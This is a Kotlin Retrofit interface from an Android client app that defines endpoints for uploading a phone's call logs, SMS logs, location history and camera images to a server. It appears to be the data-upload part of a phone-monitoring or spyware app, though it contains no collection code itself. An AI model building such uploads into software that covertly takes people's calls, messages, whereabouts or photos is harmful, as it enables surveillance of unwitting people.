package com.example.bullsseeclient.api

import okhttp3.RequestBody
import retrofit2.Call
import retrofit2.http.Body
import retrofit2.http.POST

interface DeviceDataApiService {
    @POST("api/DeviceData/calllog")
    fun sendCallLogs(@Body data: RequestBody): Call<Void>

    @POST("api/DeviceData/smslog")
    fun sendSmsLogs(@Body data: RequestBody): Call<Void>

    @POST("api/DeviceData/locationlog")
    fun sendLocationLogs(@Body data: RequestBody): Call<Void>

    @POST("api/DeviceData/cameraImage")
    fun sendCameraImages(@Body data: RequestBody): Call<Void>
}
